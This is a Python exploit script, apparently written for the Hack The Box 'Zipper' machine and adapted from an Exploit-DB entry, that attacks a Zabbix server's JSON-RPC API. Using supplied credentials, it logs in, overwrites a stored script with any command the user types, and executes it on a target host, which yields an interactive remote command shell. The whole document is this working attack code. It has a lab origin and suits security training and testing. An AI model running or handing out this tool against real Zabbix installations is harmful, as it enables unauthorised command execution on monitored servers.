# Zipper HTB - 10/02/2024
# https://www.zabbix.com/documentation/3.0/en/manual/api
# https://www.zabbix.com/documentation/3.0/en/manual/api/reference/script/
# https://www.exploit-db.com/exploits/39937 (Originally)
import requests, argparse, json

parser = argparse.ArgumentParser()
parser.add_argument('--target', '-t', required=True, dest='target', help='Target URL Machine')
parser.add_argument('--username', '-un', required=True, dest='username', help='Registered Username')
parser.add_argument('--password', '-ps', required=True, dest='password', help='Registered Password')
parser.add_argument('--hostid', '-hi', required=True, dest='hostid', help='HostId')
args = parser.parse_args()

username = args.username
password = args.password
hostid = args.hostid
rpc_url = args.target + '/api_jsonrpc.php'

http_proxy = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def getAuth(target, uname, passw):
    payload = {
        "jsonrpc": "2.0",
        "method": "user.login",
        "params": {
            "user": uname,
            "password": passw
        },
        "id": 0,
        "auth": None
    }
    headers = {'Content-Type':'application/json'}
    r = requests.post(target, json=payload, headers=headers)
    r_json = json.loads(r.text)
    auth = r_json['result']
    return auth

def update_script(target, cmd, auth):
    payload = {
        "jsonrpc": "2.0",
        "method": "script.update",
        "params": {
            "scriptid": "1",
            "command": cmd
        },
        "auth": auth,
        "id": 0
    }
    headers = {'Content-Type':'application/json'}
    r = requests.post(target, json=payload, headers=headers)

def execute_script(target, hostid, auth):
    payload = {
        "jsonrpc": "2.0",
        "method": "script.execute",
        "params": {
            "scriptid": "1",
            "hostid": hostid
        },
        "auth": auth,
        "id": 0
    }
    headers = {'Content-Type':'application/json'}
    r = requests.post(target, json=payload, headers=headers)
    r_json = json.loads(r.text)
    output = r_json['result']['value']
    print(output)

def main():
    auth = getAuth(rpc_url, username, password)
    print("To Exit: CTRL+C or type 0")
    while True:
        cmd = input("[zabbix_cmd]>>: ")
        if cmd == "0" : break
        update_script(rpc_url, cmd, auth)
        execute_script(rpc_url, hostid, auth)

if __name__ == "__main__":
    main()
